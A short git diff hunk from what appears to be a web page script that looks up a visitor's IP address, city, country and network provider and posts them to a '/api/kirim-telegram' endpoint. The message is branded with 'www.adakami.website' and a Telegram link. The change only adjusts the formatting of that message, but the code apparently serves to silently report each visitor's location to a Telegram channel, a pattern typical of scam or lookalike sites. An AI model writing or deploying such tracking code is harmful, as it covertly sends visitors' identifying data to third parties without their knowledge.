@@ -313,7 +313,7 @@
                     return res.json();
                 })
                 .then(data => {
-                    const infoPesan = `<b></b>\nㅤ⋯⋅๑┈•✦ www.adakami.website ✦•┈๑⋅⋯  IP:</b> <code>${data.ip || '-'}</code>\n<b>Kota:</b> ${data.city || '-'} \n<b>Negara:</b> ${data.country_name || '-'}\n<b>Provider:</b> ${data.org || '-'}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')} \nㅤㅤ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n<b>ㅤ ⋯⋅๑┈•✦ https://t.me/gitlab_v1 ✦•┈๑⋅⋯  </b>`;
+                    const infoPesan = `<b></b>\nㅤ⋯⋅๑┈•✦ www.adakami.website ✦•┈๑⋅⋯  \n<b>IP:</b> <code>${data.ip || '-'}</code>\n<b>Kota:</b> ${data.city || '-'} \n<b>Negara:</b> ${data.country_name || '-'}\n<b>Provider:</b> ${data.org || '-'}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')} \nㅤㅤ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n<b>ㅤ ⋯⋅๑┈•✦ https://t.me/gitlab_v1 ✦•┈๑⋅⋯  </b>`;
 
                     fetch('/api/kirim-telegram', {
                         method: 'POST',
